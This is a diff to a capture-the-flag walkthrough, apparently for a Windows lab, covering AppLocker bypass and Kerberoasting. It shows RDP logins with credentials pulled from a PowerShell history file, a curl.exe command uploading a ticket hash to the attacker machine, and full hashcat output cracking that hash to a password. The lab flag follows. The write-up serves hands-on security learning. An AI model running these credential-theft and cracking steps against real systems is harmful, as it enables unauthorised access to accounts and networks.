@@ -8,7 +8,10 @@ Bypass Windows Applocker and escalate your privileges. Also covers examples of k
 - Applocker introduced in 2007
 - Allows restriction by path, hash, publisher
 - Windows Powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-
+- rdp in xfreerdp or remina, I tend to like xfreerdp
+```
+  xfreerdp /u:'corp\dark' /p:'_QuejVudId6' /v:<targetIP>
+```
 Answer: obtained straight from ConsoleHost_history.txt file
 
 Task 3:
@@ -156,4 +159,98 @@ upload file to attackbox.
 PS C:\Users\dark> curl.exe -F "files=@C:\users\dark\ToCrack.txt" http://10.66.116.47/upload
 PS C:\Users\dark>
 ```
+Next crack given hashcat -m 13100 -​a 0 hash.txt wordlist --force
 
+```
+# hashcat -m 13100 -a 0 Hash.txt /usr/share/wordlists/rockyou.txt  --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-haswell-AMD EPYC 7571, 1410/2884 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553435 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 67106875 bytes (47.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660309 bytes (71.Dictionary cache building /usr/share/wordlists/rockyou.txt: 134213745 bytes (95.Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 10 secs
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$krb5tgs$HTTP/fela:c0a2cb48f3039e24756b9eb0aed1b93a$f4d98b830385b74f767f67e7cd0ecaf4eb87a0c93ed3a8517aaa967435f0dd90fc907df1b7477bd7571856b7fbd7778931b7f71a6349590e954516e037102f0db17dcfa5c99369fba4b1759b70a73fccf73d6b37cb594ce48fac642b41d37778a75797bcdf72e4db9470f7ff3d2911012fbdd7f7d84e82f3693f77f2a0e33c8fea43a87bd927aa606d89397eb40f69c6f2078085716e8875ce3496f91d65653fbae8f0870b91dc26549f1312d4afef02d27a0856c4aaecfaf69550287906ec50569fa258696cafcc63f5607cbaeca1955fa974c3e10108244887135b54fe7e5aa0d267b9d745a61a470b660a546cc2582ffb0c066600876c399653f887779f2d6cb67b0e9556d694b39b3280ed916e0377c27ef3bccc078b3ad21d6db9aec9c2d525dde46895d125d2ec2b22cd127de42bd5ecce286bb699b114cc973141607b64c7730fbf00cbb4272c5f2150fb85257e0e10fc1314467f86d74b84df5330bc76bd13b3a92e8401c0cccc042ab06bb372e52b1893a0c398100fda6d9a6077edf0543c64fa4950b91c623c26620c806452152387158230a0461f1f2b6b9c837d0a0aa44ad7b922e475dc406fb544ebe7af7a715c5d66eeaed6463d0ca7ed14db2e8951b09ce8ad58702eb52243609b7df2d5fd0b19e77ae5a58844c7a979d3610a1a4fd53996c56e150eddd9f61908d2154c191ca03d89dd199daf59b0c8334fbddde6ff9314d22e238626946af92ef1e5a2aa9484b5ff6a11f337897ab4d09e12c03db81b70a05ed59253cec32433d1ad16103a7636cf5fe2b14a630d1e2eb8ac78334654f455b2a1a8d132d56c67db0038cc9579bd89b219b10dc10cf58e536adf4729cc32476e18fa4757cf0f8246fe24211d63a5dad3f590515b3cb146ab6f80655421c1043a558054ad277139f30282049f83f7142791929bcd33e3040c4ebd40f13d069d36be59e41e15bda1f4930474f9941e751f35ae46ba85fc62552666486ee29d0ac70b02905a3cea530fd90a09434ab6f939a98b272dc65e67a5f422e581af9ad053d85a063c2e2374f6cdff90ee5df37c23c8e7a88f335c61356518fc393e7e5e124ad638e28d5a856a248224dec80320d12907ea2be42e8274f1528acb32a4d62b058cbb827c01968f5ff6ee6d137474542cd9813505ac0a69a6f191b3e16cf71ebd081c57016f43d184672187fb6e136731bcf8c3bfedc02d78dceab03c44f1e42b76d940fe297c47acbb56592ca5946ed69b9160924a24a17d19a751286dff616606a0d71a90897ae3f185242bc59080e8387d9948a528e3a3e4121ec11c5b402a0aba85cf8a5c6abbb71bda32c30905fdd4a8ca4198a4afeaff43c8b0bdc61f6ab8c93ce6eb11d8126729cd016e7af423411f8becec8c300b:rubenF124
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$HTTP/fela:c0a2cb48f3039e24756b9eb0aed1b93a...8c300b
+Time.Started.....: Sun Oct 11 08:31:38 2026, (11 secs)
+Time.Estimated...: Sun Oct 11 08:31:49 2026, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   377.5 kH/s (1.01ms) @ Accel:256 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 4132864/14344384 (28.81%)
+Rejected.........: 0/4132864 (0.00%)
+Restore.Point....: 4132352/14344384 (28.81%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: rubens6 -> ruben5277
+Hardware.Mon.#1..: Util: 60%
+
+Started: Sun Oct 11 08:30:49 2026
+Stopped: Sun Oct 11 08:31:50 2026
+root@ip-10-66-116-47:~# 
+
+```
+Then login with xfreerdp and on desktop is the file flag.txt:
+```
+# xfreerdp /p:'rubenF124' /u:'corp\fela' /v:<targetIP>
+...
+Do you trust the above certificate? (Y/T/N) y
+...
+```
+flag is flag{bde1642535aa396d2439d86fe54a36e4}
